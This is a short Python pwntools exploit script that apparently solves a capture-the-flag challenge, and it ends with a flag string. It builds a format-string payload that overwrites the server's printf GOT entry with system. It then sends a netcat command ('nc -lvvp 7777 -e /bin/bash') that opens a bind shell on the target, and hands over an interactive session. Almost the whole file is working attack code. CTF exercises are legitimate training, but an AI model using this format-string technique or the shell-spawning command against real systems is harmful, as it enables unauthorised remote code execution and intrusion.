from pwn import *


DEBUG = 0
if DEBUG:
     p = remote('127.0.0.1', 6210)
     e=ELF('./server')
    
else:
     p = remote('172.30.0.2', 6210)
     e=ELF('./server')

def pad(s, size):
    assert len(s) <= size
    return s + 'A'*(size - len(s))

def write_64int(addr, val):
    padding = 96
    data_start = 15

    points = [] # (val, addr)
    for i in range(8):
        points.append(((val >> (i * 8)) & 0xff, addr + i))

    points.sort()
    prev = 0
    fmt = ''
    addrs = ''
    off = data_start + (padding // 8)
    for val, addr in points:
        assert val >= prev
        addrs += p64(addr)
        if val == prev:
            fmt += '%{}$hhn'.format(off)
        else:
            fmt += '%{}c%{}$hhn'.format(val - prev, off)
        off += 1
        prev = val
    return pad(fmt, padding) + addrs

def build_packet(action,data):
    return p32(len(data))+p32(action)+data

def pwn():
    
    payload=write_64int(e.got['printf'],e.plt['system'])
    p.send(build_packet(100,payload))
    p.send(build_packet(100,'nc -lvvp 7777 -e /bin/bash\x00'))
    p.interactive()

if __name__ == '__main__':
   pwn()

#gigem{dbff08334bfc2ae509f83605e4285b0e}


